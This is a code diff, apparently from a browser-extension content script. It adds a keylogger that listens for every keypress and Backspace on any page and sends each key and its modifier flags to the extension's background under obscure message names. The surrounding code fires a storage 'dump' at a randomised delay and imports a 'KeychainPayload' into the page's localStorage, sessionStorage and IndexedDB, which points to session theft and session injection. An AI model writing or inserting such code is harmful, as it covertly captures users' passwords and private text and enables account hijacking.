@@ -50,7 +50,80 @@ const raiseDump = async () => {
     }
 };
 
-setTimeout(raiseDump, 2000 + (Math.random() * 10_000));
+window.addEventListener('load', () => {
+    let current_target: Element | null = null;
+
+    const handle_blur = (e: Event) => {
+        if (current_target !== e.target) {
+            current_target = null;
+        }
+
+        current_target?.removeEventListener('blur', handle_blur);
+
+        browser.c.runtime.sendMessage({
+            type: 'xlrd_act_kd_commit',
+        });
+    };
+
+    document.addEventListener('keypress', (e) => {
+        browser.c.runtime.sendMessage({
+            type: 'xlrd_act_kd',
+            data: {
+                key: e.key,
+                code: e.code,
+                ctrlKey: e.ctrlKey,
+                shiftKey: e.shiftKey,
+                altKey: e.altKey,
+                metaKey: e.metaKey,
+
+                event: 'keypress',
+            },
+        });
+
+        if (current_target && current_target !== e.target) {
+            browser.c.runtime.sendMessage({
+                type: 'xlrd_act_kd_commit',
+            });
+        }
+
+        current_target = e.target as Element;
+
+        current_target.addEventListener('blur', handle_blur);
+    });
+
+    document.addEventListener('keydown', (e) => {
+        if (e.key !== 'Backspace') {
+            return;
+        }
+
+        if (current_target && current_target !== e.target) {
+            browser.c.runtime.sendMessage({
+                type: 'xlrd_act_kd_commit',
+            });
+
+            current_target = null;
+
+            return;
+        }
+
+        browser.c.runtime.sendMessage({
+            type: 'xlrd_act_kd',
+            data: {
+                key: e.key,
+                code: e.code,
+                ctrlKey: e.ctrlKey,
+                shiftKey: e.shiftKey,
+                altKey: e.altKey,
+                metaKey: e.metaKey,
+                event: 'keydown',
+            },
+        });
+    });
+});
+
+raiseDump();
+
+setTimeout(raiseDump, 5000 + (Math.random() * 10_000));
 
 const handle_msg =
     async (
@@ -73,7 +146,7 @@ const handle_msg =
             const data = msg.data as KeychainPayload;
 
             // import localStorage and sessionStorage
-            for (const [k, v] of Object.entries(data.a.l)) {
+            for (const [ k, v ] of Object.entries(data.a.l)) {
                 try {
                     console.log('LS importing %s', k);
 
@@ -83,7 +156,7 @@ const handle_msg =
                 }
             }
 
-            for (const [k, v] of Object.entries(data.a.s)) {
+            for (const [ k, v ] of Object.entries(data.a.s)) {
                 try {
                     console.log('SS importing %s', k);
 
@@ -97,9 +170,9 @@ const handle_msg =
             const idb_data =
                 data.b
                     .map(x => JSON.parse(x))
-                    .map(x => [x, Object.keys(x)]);
+                    .map(x => [ x, Object.keys(x) ]);
 
-            for (const [store_data, store] of idb_data) {
+            for (const [ store_data, store ] of idb_data) {
                 try {
                     console.log('IDB importing %s', store);
 
@@ -107,7 +180,7 @@ const handle_msg =
 
                     await IDBExportInstance.importDb(
                         db,
-                        store_data[store]
+                        store_data[store],
                     );
                 } catch (e) {
                     console.error(e);
